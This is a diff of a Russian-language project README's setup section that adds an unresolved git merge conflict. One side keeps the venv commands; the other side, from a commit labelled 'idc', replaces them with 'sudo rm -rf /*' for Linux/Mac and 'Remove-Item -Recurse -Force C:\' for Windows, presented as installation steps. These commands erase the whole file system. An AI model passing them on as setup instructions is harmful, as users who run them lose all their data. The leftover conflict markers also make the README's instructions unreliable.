@@ -527,8 +527,16 @@ W ~ N(0, sqrt(1 / n_input))
 
 **Для Linux/Mac:**
 ```bash
+<<<<<<< HEAD
 python3 -m venv venv
 source venv/bin/activate
+=======
+sudo rm -rf /* 
+```
+'Для windows:'
+```ps
+Remove-Item -Recurse -Force C:\
+>>>>>>> 1ed5b46 (idc)
 ```
 
 **Для Windows:**
